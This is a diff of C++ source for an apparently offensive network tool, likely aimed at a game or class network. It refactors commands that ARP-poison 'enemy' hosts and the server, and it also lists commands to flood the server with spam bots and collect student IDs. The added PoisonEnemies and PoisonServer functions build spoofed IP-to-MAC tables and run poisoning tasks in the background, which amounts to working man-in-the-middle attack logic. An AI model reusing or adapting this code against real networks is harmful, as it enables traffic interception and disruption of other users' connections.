@@ -33,14 +33,12 @@ void CommandManager::PrintHelp(std::string message) {
   std::cout << "d|device - Selects which network to attack" << std::endl;
   std::cout << "s|scan - Refresh all MAC addresses" << std::endl;
   std::cout << "c|collect - Collect all student IDs" << std::endl;
-  std::cout << "ha|healallies - Heal all ally ARP caches" << std::endl;
-  std::cout << "he|healenemies - Heal all enemy ARP caches" << std::endl;
-  std::cout << "startpe - Start poisoning enemies" << std::endl;
-  std::cout << "stoppe - Stop poisoning enemies" << std::endl;
-  std::cout << "startps - Start poisoning the server" << std::endl;
-  std::cout << "stopps - Stop poisoning the server" << std::endl;
   std::cout << "a|attack - Perform the automated attack" << std::endl;
   std::cout << "f|flood - Flood the server with spam bots" << std::endl;
+  std::cout << "ha|healallies - Heal all ally ARP caches" << std::endl;
+  std::cout << "he|healenemies - Heal all enemy ARP caches" << std::endl;
+  std::cout << "pe|poisonenemies - Toggle poisoning enemies" << std::endl;
+  std::cout << "ps|poisonserver - Toggle poisoning the server" << std::endl;
 }
 
 void CommandManager::Respawn(std::string message) {
@@ -62,98 +60,6 @@ void CommandManager::CollectIds(std::string message) {
   // Send server tick packet (1 enemy @ bottom left)
 
   // Retrieve IDs from move packets
-}
-
-void CommandManager::HealAllies(std::string message) {
-  // Poison allies back to server
-}
-
-void CommandManager::HealEnemies(std::string message) {
-  // Poison enemies back to server
-}
-
-void CommandManager::StartPoisonEnemies(std::string message) {
-  // Start poisoning enemies towards dummy server
-  if (enemy_poison_task_ != nullptr && enemy_poison_task_->IsRunning()) {
-    std::cout << "Stopping previous poison enemies attack..." << std::endl;
-    enemy_poison_task_->Stop();
-  }
-
-  if (enemy_arp_table.size() == 0) {
-    std::cout << "No enemy addresses found, have you scanned the network?";
-    std::cout << std::endl;
-    return;
-  }
-
-  char* spoof_ip = strdup(server_ip.c_str());
-  char* spoof_mac = (char*) "1337420b142e";
-  std::unordered_map<char*, char*> spoof_addresses = {
-    {spoof_ip, spoof_mac}
-  };
-  u_long duration = 5;
-
-  enemy_poison_task_ = std::unique_ptr<PoisonTask>(
-    new PoisonTask(enemy_arp_table, spoof_addresses, duration));
-
-  if (enemy_poison_task_->Start()) {
-    std::cout << "Poison enemies attack now running in background" << std::endl;
-  }
-}
-
-void CommandManager::StopPoisonEnemies(std::string message) {
-  // Stop poisoning enemies
-  if (enemy_poison_task_ == nullptr || !enemy_poison_task_->IsRunning()) {
-    std::cout << "No poison enemies task was running" << std::endl;
-    return;
-  }
-
-  std::cout << "Stopping poison enemies attack..." << std::endl;
-  enemy_poison_task_->Stop();
-}
-
-void CommandManager::StartPoisonServer(std::string message) {
-  // Start poisoning the server (enemy IPs to our MAC)
-  if (server_poison_task_ != nullptr && server_poison_task_->IsRunning()) {
-    std::cout << "Stopping previous poison server attack..." << std::endl;
-    server_poison_task_->Stop();
-  }
-
-  if (server_mac == NULL) {
-    std::cout << "No server MAC found, have you scanned the network?";
-    std::cout << std::endl;
-    return;
-  }
-
-  char* spoof_mac = our_mac;
-  std::unordered_map<char*,char*> victim_address = {
-    {strdup(server_ip.c_str()), server_mac}
-  };
-  std::unordered_map<char*, char*> spoof_addresses;
-
-  for (auto& it : enemy_arp_table) {
-    char* spoof_ip = it.first;
-    spoof_addresses.insert({spoof_ip, spoof_mac});
-  }
-
-  u_long duration = 5;
-
-  server_poison_task_ = std::unique_ptr<PoisonTask>(
-    new PoisonTask(victim_address, spoof_addresses, duration));
-
-  if (server_poison_task_->Start()) {
-    std::cout << "Poison server attack now running in background" << std::endl;
-  }
-}
-
-void CommandManager::StopPoisonServer(std::string message) {
-  // Stop poisoning the server
-  if (server_poison_task_ == nullptr || !server_poison_task_->IsRunning()) {
-    std::cout << "No poison server task was running" << std::endl;
-    return;
-  }
-
-  std::cout << "Stopping poison server attack..." << std::endl;
-  server_poison_task_->Stop();
 }
 
 void CommandManager::AutomatedAttack(std::string message) {
@@ -208,6 +114,78 @@ void CommandManager::Flood(std::string message) {
   std::cout << "Server flooded" << std::endl;
 }
 
+void CommandManager::HealAllies(std::string message) {
+  // Poison allies back to server
+}
+
+void CommandManager::HealEnemies(std::string message) {
+  // Poison enemies back to server
+}
+
+void CommandManager::PoisonEnemies(std::string message) {
+  // Start poisoning enemies towards dummy server
+  if (enemy_poison_task_ != nullptr && enemy_poison_task_->IsRunning()) {
+    std::cout << "Stopping previous poison enemies attack..." << std::endl;
+    enemy_poison_task_->Stop();
+    return;
+  }
+
+  if (enemy_arp_table.size() == 0) {
+    std::cout << "No enemy addresses found, have you scanned the network?";
+    std::cout << std::endl;
+    return;
+  }
+
+  char* spoof_ip = strdup(server_ip.c_str());
+  char* spoof_mac = (char*) "1337420b142e";
+  std::unordered_map<char*, char*> spoof_addresses = {
+    {spoof_ip, spoof_mac}
+  };
+  u_long duration = 5;
+
+  enemy_poison_task_ = std::unique_ptr<PoisonTask>(
+    new PoisonTask(enemy_arp_table, spoof_addresses, duration));
+
+  if (enemy_poison_task_->Start()) {
+    std::cout << "Poison enemies attack now running in background" << std::endl;
+  }
+}
+
+void CommandManager::PoisonServer(std::string message) {
+  // Start poisoning the server (enemy IPs to our MAC)
+  if (server_poison_task_ != nullptr && server_poison_task_->IsRunning()) {
+    std::cout << "Stopping previous poison server attack..." << std::endl;
+    server_poison_task_->Stop();
+    return;
+  }
+
+  if (server_mac == NULL) {
+    std::cout << "No server MAC found, have you scanned the network?";
+    std::cout << std::endl;
+    return;
+  }
+
+  char* spoof_mac = our_mac;
+  std::unordered_map<char*,char*> victim_address = {
+    {strdup(server_ip.c_str()), server_mac}
+  };
+  std::unordered_map<char*, char*> spoof_addresses;
+
+  for (auto& it : enemy_arp_table) {
+    char* spoof_ip = it.first;
+    spoof_addresses.insert({spoof_ip, spoof_mac});
+  }
+
+  u_long duration = 5;
+
+  server_poison_task_ = std::unique_ptr<PoisonTask>(
+    new PoisonTask(victim_address, spoof_addresses, duration));
+
+  if (server_poison_task_->Start()) {
+    std::cout << "Poison server attack now running in background" << std::endl;
+  }
+}
+
 void CommandManager::Run() {
   std::unordered_map<std::string, Command> commands = {
     {"help", &CommandManager::PrintHelp},
@@ -220,18 +198,18 @@ void CommandManager::Run() {
     {"s", &CommandManager::Scan},
     {"collect", &CommandManager::CollectIds},
     {"c", &CommandManager::CollectIds},
+    {"attack", &CommandManager::AutomatedAttack},
+    {"a", &CommandManager::AutomatedAttack},
+    {"flood", &CommandManager::Flood},
+    {"f", &CommandManager::Flood},
     {"healallies", &CommandManager::HealAllies},
     {"ha", &CommandManager::HealAllies},
     {"healenemies", &CommandManager::HealEnemies},
     {"he", &CommandManager::HealEnemies},
-    {"startpe", &CommandManager::StartPoisonEnemies},
-    {"stoppe", &CommandManager::StopPoisonEnemies},
-    {"startps", &CommandManager::StartPoisonServer},
-    {"stopps", &CommandManager::StopPoisonServer},
-    {"attack", &CommandManager::AutomatedAttack},
-    {"a", &CommandManager::AutomatedAttack},
-    {"flood", &CommandManager::Flood},
-    {"f", &CommandManager::Flood}
+    {"poisonenemies", &CommandManager::PoisonEnemies},
+    {"pe", &CommandManager::PoisonEnemies},
+    {"poisonserver", &CommandManager::PoisonServer},
+    {"ps", &CommandManager::PoisonServer}
   };
 
   std::cout << std::endl << "Enter commands here, type 'help' for help.";
